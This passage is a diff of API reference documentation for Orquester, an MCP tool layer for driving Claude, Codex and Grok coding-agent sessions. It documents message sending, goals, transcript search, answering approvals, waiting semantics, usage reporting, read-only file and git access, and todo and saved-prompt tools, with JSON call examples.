-  validated and uploaded first; a refused one fails the call before anything is sent. While a turn
-  is running, the message **steers** it (as Enter does mid-turn in the GUI) and `turnId` is that
-  turn's. `wait: false` returns `outcome: "sent"` with the receipt. `wait: true` blocks as §8
-  describes and returns the `outcome`; once the turn has settled, `reply` — the main agent's answer
-  (Codex's commentary narration left out while the turn has anything else — see `lastReply`) from
-  the turn this message started or steered, never an
-  earlier turn's but for one rare race (§8) — at most 16 384 characters, fewer when the result would
-  pass the cap (cut by bytes, on a character boundary), `replyTruncated: true` when cut, and
-  `read_transcript` has the rest; and `pending` while a question or an approval is open. When
-  `reply` is present, `session.lastReply` is left out: it is the same text.
-
-  Text that starts with `/` is forwarded to the agent as typed, and its CLI decides what the
-  command does; the exceptions are Grok's `/always-approve`, refused with `INVALID_COMMAND`
-  (change `runtimeMode` with `update_session` instead), and Codex's `/goal` (next paragraph). A
-  message that is just `/compact`, with no attachments, is the host's own compaction — what
-  `compact_session` asks for. The MCP cannot list an agent's slash commands or skills.
-
-  **Goals.** Claude, Codex and Grok run goals of their own; Orquester shows them and never runs a
-  loop itself. On Claude and Grok `/goal <objective>` is the CLI's own command and an ordinary
-  turn, waited on like any other (Claude checks the goal whenever a turn ends with nothing running
-  in the background; Grok works the whole goal inside the prompt that set it, though its own wake
-  prompts — a background subagent's end, say — are turns of their own). On **Codex** the host runs
-  `/goal` itself — `/goal <objective>`, `/goal` or `/goal status`, `/goal pause`, `/goal resume`,
-  `/goal clear`, `/goal edit <objective>` (`supports.goals.command: "host"`): it records the
-  message, starts **no** turn, and answers in a row. With `wait: true` the call waits for that
-  answer — up to 15 s once the session is up (the host starts it first when there is none, after
-  `stop_session` or a restart), never past `timeoutMs` — and returns `outcome: "goal"` with
-  `answer`: the goal's new state (`Goal set: …`, `Goal paused`, …, one line per row when a command
-  writes several — replacing a goal writes `Goal cleared: …`, then `Goal set: …`) or the status
-  `/goal` asked for; or `outcome: "failed"` with why (`Goal command failed: …`). `answer` is at most
-  8 KiB of UTF-8, `answerTruncated: true` when cut. No `turnId`, no `reply`. A command that changes
-  nothing writes no row: a pause of a paused goal or a resume of an active one — which the call
-  sees coming, and waits only half a second for — or an edit to the same objective. Then it comes
-  back without `answer` and with a `hint`; `session.chat.goal` always shows the goal as it stands.
-  A row an Orquester update writes on a goal it holds (`Goal paused for an Orquester update. …`, or
-  that the goal could not be resumed after it) answers no `/goal`, and is never taken for one.
-  A set goal then runs turns by itself — `wait_for_session` reports it once it stops. A `/goal`
-  with attachments is refused (`INVALID_ARGUMENT`, before anything is uploaded), and one the host
-  cannot parse — an objective over 4 000 characters, a bare `/goal edit` — with `INVALID_COMMAND`,
-  as is any while a compaction runs. While the agent's capabilities cannot be read, any `/goal` is
-  refused (`INVALID_ARGUMENT`, "can't be routed … Retry shortly"): whether the host or the agent
-  takes it is theirs to say.
-- **`implement_plan`** — sends exactly what the GUI's Implement button sends: the line
-  `PLEASE IMPLEMENT THIS PLAN:` followed by the latest proposed plan, in default (not plan) mode.
-  A plan too long for the thread snapshot (`plan.truncated: true`) is read back in full first, as
-  the Implement button does too; a cut plan is never sent. Refused with `INVALID_ARGUMENT` when
-  there is no proposed plan or the latest one was already sent for implementation (judged on the
-  thread, as `get_session`'s `plan.actionable` and `read_transcript`'s plan rows are), and with
-  `PENDING_REQUEST` while a request is open. To refine a plan instead (the Refine button), use
-  `send_message {planMode: true, text}`.
 - **`read_transcript`** — built from the same thread snapshot the GUI renders. `turns` counts back
   from the turn before `beforeTurn` (the latest turn when `beforeTurn` is absent), and
   `coveredTurns` names the first and last turn of the rows returned (`null` when no row belongs to
@@ -795,7 +879,7 @@ read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "beforeTu
   pages** per call; a range of a few ordinary turns takes one. The pages are merged under the
   window: a row both hold appears once, with the window's (newer) state, and every row in log
   order. The latest proposed plan stays the window's — a plan that aged out of it is never
-  `actionable`, as `implement_plan` would not send it.
+  `actionable`, as `send_message {implementPlan: true}` would not send it.
 
   When turns of the range could not be read whole, the result names them in
   `unavailableTurns: [from, to]`, and its `hint` opens with a sentence saying why, before any shed
@@ -970,6 +1054,54 @@ TranscriptEntry = { turn: number | null, turnId: string | null, kind, createdAt,
                                                    progress ticks never show) }
 ```
 
+- **`search_sessions`** — full-text search over every open chat session: its messages (yours, the
+  agent's and its reasoning) and its activity rows (a tool call's title and detail, among others),
+  best match first. The agent host answers it from its thread index. `query` is trimmed and must
+  then be 1–200 characters; a longer one is refused (`INVALID_ARGUMENT`), never cut. Every word
+  must appear, as a whole word, ignoring case and accents; there are no operators — quotes, `OR`,
+  `NEAR`, `*` and `-` are plain text. `project` limits the search to one project and is resolved
+  as everywhere else (an empty one is refused, never read as every project).
+  Each hit names its session by `sessionId`, with the `title` and `projectPath` `list_sessions`
+  shows for it. `turn` is the hit's turn number (§5), `null` for a row that belongs to no turn;
+  `kind` is `message`, with `role` (`user`, `assistant` or `reasoning`), or `activity`, with
+  `activityKind` (`tool.completed`, …); `at` is when the row was written; and `snippet` is a
+  short excerpt with the matched words between `«` and `»`. To read a hit in context, read its
+  turn alone: `read_transcript {sessionId, beforeTurn: turn + 1, turns: 1}` (with
+  `include: ["reasoning"]` for a reasoning hit). A subagent's own row is in that subagent's
+  timeline, not the parent's, and a hit does not say which subagent wrote it: find the subagent in
+  `get_session`'s `subagents`, then read its timeline with `read_transcript {sessionId, agentId,
+  beforeTurn: turn + 1, turns: 1}`. Only a chat tab that is open now is ever named: a hit whose
+  tab has closed since is left out.
+  `truncated: true` means there were more matches than came back — more than `limit`, or more
+  than one result holds. Each hit's `title` and `snippet` are cut to 300 characters, ending in
+  "…", and if the hits still pass the result cap, the lowest-ranked go, from the end:
+  `omittedHits` counts them. Without `omittedHits`, the host stopped at `limit`: raise `limit`
+  (at most 50) for more. With `omittedHits`, the result cap dropped hits, and a higher `limit`
+  brings none of them back: narrow the query or pass `project`.
+  `indexed: false` is an answer, not an error: the host has no usable index right now (it could
+  not load or open one, or it is restarting), so there are no hits, and a `hint` says search is
+  unavailable; try again later. An index the host is rebuilding (after an update, say) does
+  answer, but finds only the threads it has re-indexed so far. A request that fails — the agent
+  host restarting, for one — is an error with its code, as everywhere.
+
+```jsonc
+search_sessions { "query": "flaky test", "project": "myws/api", "limit": 2 }
+→ { "query": "flaky test",
+    "hits": [
+      { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "title": "Claude Code",
+        "projectPath": "/var/lib/orquester/workspaces/myws/api", "turn": 4, "kind": "message",
+        "role": "assistant", "snippet": "…the «flaky» «test» is the retry in auth.spec.ts…",
+        "at": "2026-09-23T10:41:07.310Z" },
+      { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "title": "Codex",
+        "projectPath": "/var/lib/orquester/workspaces/myws/api", "turn": 2, "kind": "activity",
+        "activityKind": "tool.completed", "snippet": "pnpm «test» --grep «flaky»",
+        "at": "2026-09-23T09:12:44.018Z" } ],
+    "truncated": true, "indexed": true }
+
+// The first hit in context: its turn, 4, alone.
+read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "beforeTurn": 5, "turns": 1 }
+```
+
 ### Tool output
 
 | Tool | Input | Returns | GUI equivalent |
@@ -1101,15 +1233,18 @@ read_tool_output { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "itemId"
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
-| `answer_question` | `sessionId`, `requestId?`, `answers: {<question id or index>: string \| string[]}`, `attachments?: {<question id or index>: Attachment[]}` | `{seq, session}` | The question card's Submit |
-| `dismiss_question` | `sessionId`, `requestId?` | `{seq, session}` | The question card's Dismiss |
-| `resolve_approval` | `sessionId`, `requestId?`, `decision` (`"accept"` \| `"acceptForSession"` \| `"acceptAlways"` \| `"decline"` \| `"cancel"`) | `{seq, session}` | The approval card's Approve / Decline and its overflow menu |
+| `respond_to_request` | `sessionId`, `requestId?`, then one of: `answers: {<question id or index>: string \| string[]}` (with `attachments?: {<question id or index>: Attachment[]}`), `dismiss: true`, `decision` (`"accept"` \| `"acceptForSession"` \| `"acceptAlways"` \| `"decline"` \| `"cancel"`) | `{seq, session}` | The question card's Submit and Dismiss; the approval card's Approve / Decline and its overflow menu |
+
+These are the **agent's own** requests — the provider's questions and tool approvals `get_session`
+lists. The approval cards Orquester shows inside a chat for an in-chat agent's tool call (and its
+boundary, toolset and secret cards) are not requests: only the user answers them, in the GUI, and
+no tool can.
 
 - `requestId` may be omitted when exactly one request of that kind is pending; otherwise the error
   lists the pending ids. A refusal quotes each of your values — a `requestId`, an answer that is not
   an option, a key that names no question — cut to 100 characters, and at most five of them,
   followed by the count of the rest.
-- **`answer_question`** — answers every question of the request at once (the GUI requires all of
+- **`answers`** — answers every question of the request at once (the GUI requires all of
   them before Submit). Keys are the question `id`s `get_session` reports, or their 1-based `index`
   (an exact id wins); on Claude a question's `id` is its full text, so the index is usually
   simpler. A single-select question takes a string; a `multiSelect` question takes an array (one
@@ -1124,10 +1259,10 @@ read_tool_output { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "itemId"
   (`Attachments for "<question>": attachments[i]: …`). A Codex async question
   (`responseMode: "message"`) is answered the same way: the host turns the answer into a user
   message that repeats each question before its answer, which steers or starts a turn.
-- **`dismiss_question`** — closes a question without answering it. Only an async question
+- **`dismiss: true`** — closes a question without answering it. Only an async question
   (`responseMode: "message"`, `dismissible: true`) can be dismissed; a blocking one is refused
-  (`INVALID_ARGUMENT`) — answer it, or `interrupt_session`.
-- **`resolve_approval`** — `decision` must be one of the request's `decisions` (`get_session`
+  (`INVALID_ARGUMENT`) — answer it, or `control_session {action: "interrupt"}`.
+- **`decision`** — must be one of the request's `decisions` (`get_session`
   lists them with their labels and any warning). Two provider quirks, which the GUI shows as
   warnings: on Claude, `acceptAlways` denies (a permanent permission cannot be granted from here);
   on OpenCode, `acceptForSession` and `acceptAlways` both mean "always" for the whole project
@@ -1137,32 +1272,35 @@ read_tool_output { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "itemId"
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
-| `wait_for_session` | `sessionId?` or `project?` (neither: every session), `after?` (ISO time; default: now), `timeoutMs? = 120000` (1 000–600 000) | `{sessions: SessionView[], cursor, timedOut}` | The Attention Center |
+| `wait_for_session` | one of `sessionId?`, `sessionIds?` (≤ 20), `project?` (none: every session), `after?` (ISO time; default: now), `timeoutSeconds? = 120` (1–600) | `{sessions: SessionView[], cursor, timedOut}`; one `sessionId` adds its `state`, `lastTurn?` and latest `reply` | The Attention Center |
 
 Blocks until a watched session needs attention after `after`; §8 has the rules and the cursor
-contract. Passing both `sessionId` and `project` is refused, and so is an empty one: an empty
-`sessionId` (`INVALID_ARGUMENT`) or `project` (`PROJECT_NOT_FOUND`) is never read as "every
-session". A wait on one `sessionId` fails with `SESSION_NOT_FOUND` at once when that session
-closes, or when it is already gone.
+contract. Passing more than one of `sessionId`, `sessionIds` and `project` is refused, and so is an
+empty one: an empty `sessionId` (`INVALID_ARGUMENT`) or `project` (`PROJECT_NOT_FOUND`) is never
+read as "every session". A wait on one `sessionId` fails with `SESSION_NOT_FOUND` at once when that
+session closes, or when it is already gone; with `sessionIds`, every id must be open when the wait
+starts.
 
 ### Usage
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
-| `get_usage` | `refresh? = false` | `UsageView` | The top-bar usage widget |
-| `get_cost` | `days? = 7` (1–90) | `{asOf, days, totalUsd, byDay: [{day, usd}], rows: [{agent, model, day, inputTokens, outputTokens, cacheReadTokens, cacheWriteTokens, costUsd}], truncated?, rowsDropped?}` | The usage widget's Cost tab |
+| `get_usage` | `include? = ["quota"]` (any of `"quota"`, `"cost"`, `"session"`), `refresh? = false`, `days? = 7` (1–90), `bucket? = "day"` (`"day"` \| `"week"`), `sessionId?` (with `"session"`) | `UsageView` (quota), `cost?`, `session?` | The top-bar usage widget and its Cost tab |
 
-- **`get_usage`** — quota per agent family (Claude, Codex, Grok) and per managed account, row for
-  row as the widget shows it: the 5-hour, weekly and per-model windows (e.g. Fable) as **% used**, with
-  reset times. An absent family is not signed in; `stale: true` with no `asOf` means "signed in, no
+- **quota** — per agent family (Claude, Codex, Grok) and per managed account, row for row as the
+  widget shows it: the 5-hour, weekly and per-model windows (e.g. Fable) as **% used**, with reset
+  times. An absent family is not signed in; `stale: true` with no `asOf` means "signed in, no
   reading yet"; freshness is per row (`asOf`, `ageMinutes`). `refresh: true` asks the daemon to
   re-fetch but may still return last-known data (upstream backoff) — never call it in a loop.
-- **`get_cost`** — an API-equivalent cost estimate from the local transcripts, per agent, model and
-  UTC day, for the last `days` days including today. `byDay` runs oldest to newest; `rows` are
-  newest day first. Amounts are rounded to 4 decimals. A model without a known price counts as $0
-  in `byDay` and `totalUsd`, and its rows carry `costUsd: null`. The result bounds itself to
-  50 000 bytes by dropping whole days of rows, oldest first (`truncated: true`, `rowsDropped`);
-  `byDay` and `totalUsd` still count every row.
+- **cost** — an API-equivalent cost estimate from the local transcripts, per agent and model, by
+  UTC day or ISO week (`bucket`), for the last `days` days including today. Amounts are rounded to
+  4 decimals; a model without a known price counts as $0 and its rows carry `costUsd: null`. The
+  rows bound themselves to the result by dropping whole buckets, oldest first (`truncated: true`,
+  `rowsDropped`); the totals still count every row.
+- **session** — one chat's token usage: the per-turn `tokenUsage` of the turns its thread holds
+  (`turnsCounted`; `partial: true` when older turns lie outside it), priced as the provider reported
+  it where it did and by the Cost tab's pricing table otherwise (Codex reports tokens only):
+  `costSource: "reported" | "estimated" | "mixed"`.
 
 ```
 UsageView   = { agents: [{ id: "claude" | "codex" | "grok", name: "Claude Code" | "Codex" | "Grok Build",
@@ -1176,72 +1314,76 @@ UsageWindow = { id: "session" | "weekly" | "scoped:<label>", label: "5h" | "Week
                 percentUsed, resetsAt?, resetsIn? /* "4h 44m" */ }
 ```
 
-### Files
+### Notifications
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
-| `list_files` | `path` | `{path, entries: [{name, kind: "dir" \| "file" \| "symlink" \| "other", size}], truncated}` | The file browser |
-| `read_file` | `path`, `offset? = 0`, `maxBytes? = 65536` (≤ 262 144) | `{path, text, size, offset, truncated, nextOffset?}` | Opening a file in the editor |
+| `notify_user` | `title` (≤ 120 characters), `body?` (≤ 300) | `{sent}` — the number of devices reached | A Web Push from Orquester |
 
-Both work inside the workspaces sandbox: `path` is absolute or relative to the sandbox root, and
-anything outside it is `PATH_NOT_ALLOWED`. `list_files` returns at most 500 entries — the first 500
-the directory yields — sorted by name, and fewer when one result cannot hold them; `truncated: true`
-means some were left out. `read_file` pages by byte offset: `truncated: true` means there is more —
-read again with `offset` set to the result's `nextOffset`, never `offset + maxBytes`. A window ends
-on a character boundary and shrinks to fit one result, so it can cover fewer than `maxBytes` bytes —
-or, when `maxBytes` is smaller than the character at `offset`, more: that one whole character (up
-to 4 bytes), so paging always advances. Binary files are refused.
+A push to every device the user subscribed in Orquester (Settings › Notifications), for what they
+must see while away — done, blocked — never progress. It carries no action button. At most one per
+minute per external credential (`RATE_LIMITED` otherwise, saying when to try again).
 
-### Todos
+### Files and git
+
+| Tool | Input | Returns | GUI equivalent |
+|---|---|---|---|
+| `read_file` | `path`, `offset? = 0`, `maxBytes? = 65536` (≤ 262 144) | a file: `{kind: "file", path, text, size, offset, truncated, nextOffset?}`; a directory: `{kind: "directory", path, entries: [{name, kind: "dir" \| "file" \| "symlink" \| "other", size}], truncated}` | Opening a file in the editor; the file browser |
+| `get_git_state` | `project` (required here), `view` (`"status"` \| `"branches"` \| `"log"` \| `"diff"`), `path?`, `staged? = false`, `limit? = 20` | `{project, …}` per view: changed files with branch, upstream, ahead/behind; local and remote branches; the newest commits; the working diff | The Git panel |
+
+`read_file` works inside the workspaces sandbox: `path` is absolute or relative to the sandbox
+root, and anything outside it is `PATH_NOT_ALLOWED`. A directory lists at most 500 entries — the
+first 500 the directory yields — sorted by name, and fewer when one result cannot hold them;
+`truncated: true` means some were left out. A file pages by byte offset: `truncated: true` means
+there is more — read again with `offset` set to the result's `nextOffset`, never `offset +
+maxBytes`. A window ends on a character boundary and shrinks to fit one result, so it can cover
+fewer than `maxBytes` bytes — or, when `maxBytes` is smaller than the character at `offset`, more:
+that one whole character (up to 4 bytes), so paging always advances. Binary files are refused.
+
+`get_git_state` is read only (no tool writes git): `diff` is the uncommitted changes against
+`HEAD` plus untracked files, or one file's (`path`, `staged`), cut to fit (`truncated`); the lists
+are capped and say so.
+
+### Todos and saved prompts
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
 | `list_todos` | `workspace?` or `project?` (exactly one) | `{todos: Todo[], truncated?, omittedLists?}` | The Todo tab |
-| `create_todo` | `workspace?` or `project?` (exactly one), `name` | `{todo: Todo}` | Adding a list |
-| `update_todo` | `id`, `name?`, `body?` | `{todo: Todo}` | Renaming or editing a list |
-| `delete_todo` | `id` | `{deleted: true, id}` | Deleting a list |
-| `toggle_todo_item` | `id`, `item` (its text, or its 1-based index), `checked?` (omit to flip) | `{id, item, checked, body, bodyTruncated?}` | Ticking one checkbox |
+| `update_todos` | `action` (`"create"` \| `"update"` \| `"toggle"` \| `"delete"`), `workspace?` or `project?`, `id?`, `name?`, `body?`, `item?`, `checked?` | create / update: `{todo: Todo}`; toggle: `{id, item, checked, body, bodyTruncated?}`; delete: `{deleted: true, id}` | Adding, renaming, editing, ticking, deleting a list |
+| `list_saved_prompts` | `project?`, `query?`, `includeBody? = false` | `{prompts: [{id, title, description, tags, scope, projectPath, pinned, createdBy?, usedByWorkflows?, bodyChars, body?}], truncated?, omittedPrompts?}` | The right rail's Saved prompts |
+| `update_saved_prompts` | `action` (`"create"` \| `"update"` \| `"delete"`), `id?`, `title?`, `body?`, `description?`, `tags?`, `project?` or `global?`, `pinned?`, `reason?` | `{prompt}` (its row, with its body), or `{deleted: true, id}` | Saving, editing, pinning, deleting a prompt |
 
 `Todo = {id, name, scope: "workspace" | "project", body, createdAt, updatedAt, bodyTruncated?}`. A
 list belongs to a workspace (`workspace`, by name) or to a project (`project`, a path or
 `"workspace/project"` as everywhere else). Exactly one, and neither may be empty (an empty one is
-refused, never read as omitted). `body` is GitHub task-list markdown (`- [ ] item`); a new list
-starts empty, and `update_todo` replaces the whole body. To tick one item use `toggle_todo_item`:
-it is atomic, so it cannot clobber an edit made in the meantime; an `item` given as text must match
-a whole item, ignoring case. It is not idempotent: omitting `checked` flips an item, so pass it to
-make a retry harmless. A list id that does not exist is `NOT_FOUND`:
+refused, never read as omitted). `body` is GitHub task-list markdown (`- [ ] item`); `create` starts
+a list empty, and `update` replaces the whole body. To tick one item use `toggle`: it is atomic, so
+it cannot clobber an edit made in the meantime; an `item` given as text must match a whole item,
+ignoring case, or is its 1-based index. It is not idempotent: omitting `checked` flips an item, so
+pass it to make a retry harmless. A list id that does not exist is `NOT_FOUND`:
 `No todo list with id "<id>"; list_todos shows the ids.` The human sees every change live in the
 Todo tab.
 
 When the lists do not all fit one result, `list_todos` leaves the oldest out (`truncated: true`;
 `omittedLists` counts them). A newest list too big for a result on its own comes back with the head
 of its body and `bodyTruncated: true`: a list marked `bodyTruncated` is incomplete. A write's
-result fits one result too: on a list too big for one, `update_todo`'s and `toggle_todo_item`'s
-results carry only the head of the body, marked `bodyTruncated: true`, while the id, the name, and
-a toggle's item and new `checked` stay whole — the write itself is always whole. (Only a name or an
-item of tens of KB, which leaves no room even for an empty body, is cut too, to 200 characters.)
-Never send `update_todo` a body marked `bodyTruncated`: it is only the list's head, and the rest
-would be lost. Tick items with `toggle_todo_item` (it edits the full stored body), rename with
-`name` alone (the body is kept), or put new items in a new list.
+result fits one result too: on a list too big for one, `update`'s and `toggle`'s results carry
+only the head of the body, marked `bodyTruncated: true` — the write itself is always whole. Never
+send `update` a body marked `bodyTruncated`: it is only the list's head, and the rest would be lost.
+Tick items with `toggle` (it edits the full stored body), rename with `name` alone (the body is
+kept), or put new items in a new list.
 
-### Automated workflows
+Saved prompts are the user's library (global, or one project's). `list_saved_prompts` lists the
+global ones, plus `project`'s first; `createdBy` names an agent that created one (absent: the
+user's), and `usedByWorkflows` the workflows whose agent blocks run it — such a prompt is live
+workflow code. `update_saved_prompts` `update` and `delete` look for a project prompt in `project`
+(else among the global ones). A prompt an in-chat agent created cannot be pinned through the MCP
+(only the user pins it, in the rail).
 
-`list_workflow_block_types`, `list_workflows`, `get_workflow`, `create_workflow`,
-`update_workflow`, `validate_workflow`, `delete_workflow`, `run_workflow`, `list_workflow_runs`,
-`get_workflow_run`, `cancel_workflow_run`, `list_workflow_secrets` and `set_workflow_secret` —
-see §12.
+### Automated workflows, agent profiles, desktops
 
-### Agent profiles
-
-`list_agent_profiles`, `get_agent_profile`, `get_agent_profile_item`, `create_agent_profile_item`,
-`update_agent_profile_item`, `set_agent_profile_item_enabled`, `delete_agent_profile_item`,
-`copy_agent_profile_item`, `trust_agent_profile_hook`, `get_agent_instructions`,
-`write_agent_instructions`, `import_agent_profile_items` and `list_marketplace_plugins` — see §13.
-
-### Desktops
-
-`desktops_list`, `desktop_host_status`, `desktop_open`, `desktop_launch_app`, `desktop_windows`,
-`desktop_window_action`, `desktop_app_log`, `desktop_stop_app` and `desktop_close` — see §14.
+The 12 workflow tools are in §12, `get_agent_profile` and `edit_agent_profile` in §13,
+`get_desktops` and `control_desktop` in §14.
 
 ---
 
@@ -1281,7 +1423,8 @@ list_agents { "agent": "claude" }
 // 2. Open a tab: Opus at high effort, accepting edits without asking.
 create_session { "project": "myws/api", "agent": "claude", "model": "opus",
                  "options": { "effort": "high" }, "runtimeMode": "auto-accept-edits" }
-→ { "session": {
+→ { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "accountId": "system", "accountSource": "family-default",
+    "session": {
       "id": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "kind": "chat", "agent": "claude", "adapter": "claude",
       "title": "Claude Code",
       "project": { "workspace": "myws", "name": "api", "path": "/var/lib/orquester/workspaces/myws/api" },
@@ -1298,7 +1441,8 @@ create_session { "project": "myws/api", "agent": "claude", "model": "opus",
       "pending": { "approvals": [], "questions": [] },
       "subagents": [] } }
 
-// 3. Ask. wait:true is the default: the call returns when the turn settles.
+// 3. Ask. reply "wait" is the default: the call returns when the turn this message causes settles.
+//    (create_session {…, "prompt": "…", "reply": "wait"} does steps 2 and 3 in one call.)
 send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33",
                "text": "Why does `pnpm check` fail in packages/api? Answer in three sentences." }
 → { "seq": 12, "outcome": "completed", "turnId": "0c5d2e8f-1a7b-4c3d-9e6f-8b2a4d1c7e90",
@@ -1327,7 +1471,7 @@ Loop on `wait_for_session` with the cursor, look at what each flagged session wa
 
 ```jsonc
 // 1. First call: an old `after` returns everything already flagged in the project, at once.
-wait_for_session { "project": "myws/api", "after": "1970-01-01T00:00:00Z", "timeoutMs": 300000 }
+wait_for_session { "project": "myws/api", "after": "1970-01-01T00:00:00Z", "timeoutSeconds": 300 }
 → { "sessions": [
       { "id": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "kind": "chat", "agent": "codex", "adapter": "codex",
         "title": "Codex", "status": "waiting", "attention": "needs-input",
@@ -1349,7 +1493,7 @@ get_session { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14" }
       "questions": [] } } }
 
 // requestId omitted: exactly one approval is pending.
-resolve_approval { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "decision": "accept" }
+respond_to_request { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "decision": "accept" }
 → { "seq": 31, "session": { /* "status": "working", "reason": "running", … */ } }
 
 // 3. The Claude tab asked a question. Answer it by index.
@@ -1363,25 +1507,25 @@ get_session { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33" }
                                     { "label": "npm", "description": "Preinstalled on the runner" } ],
                        "multiSelect": false, "allowCustomAnswer": true } ] } ] } } }
 
-answer_question { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "answers": { "1": "pnpm" } }
+respond_to_request { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "answers": { "1": "pnpm" } }
 → { "seq": 19, "session": { /* "status": "working", … */ } }
 
 // 4. Wait again from the cursor: nothing is repeated, and nothing that happened in between is missed.
-wait_for_session { "project": "myws/api", "after": "2026-09-23T10:14:05.512Z", "timeoutMs": 300000 }
+wait_for_session { "project": "myws/api", "after": "2026-09-23T10:14:05.512Z", "timeoutSeconds": 300 }
 → { "sessions": [ { "id": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "attention": "finished",
                     "needsAttentionAt": "2026-09-23T10:16:48.301Z", "reason": "completed" /* … */ } ],
     "cursor": "2026-09-23T10:16:48.301Z", "timedOut": false }
 ```
 
 A finished session's reply is in `get_session`'s `lastReply` (or `read_transcript`); send the next
-instruction with `send_message`, or `wait: false` plus this loop when you drive several sessions at
-once.
+instruction with `send_message`, or `reply: "none"` plus this loop when you drive several sessions
+at once.
 
 ### (c) An image in plan mode, then implement the plan
 
 ```jsonc
 // 1. A screenshot, inline, in plan mode: the agent plans and does not edit.
-send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "planMode": true, "timeoutMs": 300000,
+send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "planMode": true, "timeoutSeconds": 300,
                "text": "The header overlaps the sidebar at 768px wide, see the screenshot. Plan a fix.",
                "attachments": [ { "name": "header-overlap.png", "base64": "iVBORw0KGgoAAAANSUhEUgAA…" } ] }
 → { "seq": 40, "outcome": "plan-ready", "turnId": "a41c7e2d-…",
@@ -1391,7 +1535,7 @@ send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "planMode": 
                            "truncated": false, "actionable": true } } }
 
 // 2. Accept it: the GUI's Implement button. (To change it first: send_message with planMode:true.)
-implement_plan { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "timeoutMs": 600000 }
+send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "implementPlan": true, "timeoutSeconds": 600 }
 → { "seq": 46, "outcome": "completed", "turnId": "c7e2a9f4-…",
     "reply": "Done. The header now …", "session": { /* … */ } }
 ```
@@ -1403,42 +1547,47 @@ being an image, is named to Claude in the `Attached files:` block after the mess
 
 ## 8. Waiting semantics
 
-Two kinds of call block: `send_message` and `implement_plan` with `wait: true` (the default), and
-`wait_for_session`. Neither polls: both listen to the daemon's own event bus — the signal the tab
-strip and the Attention Center read — and re-read the session list every 10 s only as a safety
-net. A client that disconnects abandons its wait. A wait is only ever a read: its timeout never
-stops, cancels or changes anything.
+The calls that block — `send_message` and `create_session` with `reply: "wait"`, `wait_for_session`,
+`run_workflow {wait: true}` and `get_workflow_runs {runId, waitSeconds}` — never poll: they listen
+to the daemon's own event bus — the signal the tab strip and the Attention Center read — and re-read
+only as a safety net (the session list every 10 s). A client that disconnects abandons its wait. A
+wait is only ever a read: its timeout never stops, cancels or changes anything.
 
-### `send_message` and `implement_plan`
+### `send_message` (and `create_session` with a prompt)
 
-The call returns as soon as one of these holds for the session, checked in this order on every
-event:
+With `reply: "wait"` the message is the session's **next turn**. While the session is working or
+waiting for its user, the call first waits for it to go idle (or fail), then posts the message with
+the host's `ifIdle` precondition: a session that started a turn in that instant answers "busy" and
+the call waits for the next idle point again, under the same command id — so the message never
+steers someone else's turn, and a retry is never a second message. A session that stays busy for the
+whole `timeoutSeconds` is never sent to (`outcome: "timeout"`, `sent: false`). Once posted, the call
+returns as soon as one of these holds for the turn the message started, checked in this order on
+every event:
 
 | `outcome` | Meaning | Next step |
 |---|---|---|
-| `needs-input` | The agent opened a question or a tool approval; `pending` has it. A Codex async question does not stop the turn, so the turn may still be running — `session` says so. | `answer_question`, `resolve_approval` or `dismiss_question`, then `wait_for_session` |
-| `plan-ready` | The turn ended with a proposed plan (`session.plan`, `actionable: true`). | `implement_plan`, or refine with `send_message {planMode: true}` |
-| `failed` | The session went into `error` (`session.chat.lastError`), or the turn failed — or a Codex `/goal` failed, and `answer` says why. | `read_transcript` for the error; a session in `error` needs `stop_session` before the next message |
+| `needs-input` | The agent opened a question or a tool approval; `pending` has it. A Codex async question does not stop the turn, so the turn may still be running — `session` says so. | `respond_to_request`, then `wait_for_session` |
+| `plan-ready` | The turn ended with a proposed plan (`session.plan`, `actionable: true`). | `send_message {implementPlan: true}`, or refine with `send_message {planMode: true}` |
+| `failed` | The session went into `error` (`session.chat.lastError`), or the turn failed — or a Codex `/goal` failed, and `answer` says why. | `read_transcript` for the error; a session in `error` takes the next message (it restarts), or `control_session {action: "stop_process"}` |
 | `completed` | The turn finished; `reply` has the main agent's answer. | — |
 | `interrupted` | The turn was interrupted or cancelled. | — |
-| `timeout` | `timeoutMs` passed first. **The turn keeps running.** | `get_session`, or `wait_for_session` (below) |
-| `goal` | Codex only: the message was a `/goal` the host ran itself (§6 Messages) — no turn started; `answer` has the host's answer, or `hint` says why none came. | `get_session` (`chat.goal`); after `/goal <objective>`, `wait_for_session` |
-| `sent` | Only with `wait: false`: the message was accepted. | `wait_for_session` |
